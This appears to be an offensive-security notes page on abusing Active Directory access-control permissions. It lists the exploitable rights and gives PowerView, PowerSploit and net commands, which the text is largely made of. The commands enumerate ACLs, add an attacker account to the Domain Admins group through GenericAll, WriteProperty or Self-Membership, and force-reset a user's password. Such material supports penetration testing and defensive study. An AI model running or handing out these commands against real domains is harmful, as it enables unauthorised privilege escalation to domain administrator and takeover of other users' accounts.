# Abusing Active Directory ACLs/ACEs

{% hint style="danger" %}
WIP
{% endhint %}

## Context

Some of the exploitable permissions:

* **GenericAll** - full rights to the object \(add users to a group or reset user's password\)
* **GenericWrite** - update object's attributes \(i.e logon script\)
* **WriteOwner** - change object owner to attacker and have full control over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self \(Self-Membership\)** - ability to add yourself to a group

## Execution

### GenericAll on User

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-17-14.png)

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-19-43.png)

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-23-18.png)

### GenericAll on Group

```csharp
Get-NetGroup "domain admins" -FullData
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-50-20.png)

```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-52-10.png)

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/peek-2018-11-08-10-07.gif)

```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### WriteProperty on Group

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-11-11.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-06-32.png)

### Self \(Self-Membership\) on Group

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-23-52.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-25-23.png)

### **ForceChangePassword**

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-30-11.png)

```csharp
# powerview
Set-DomainUserPassword -Identity delegate -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-31-52.png)

or a one liner:

```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-58-25.png)

```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-14-11-25.png)



## References

{% embed url="https://wald0.com/?p=112" %}

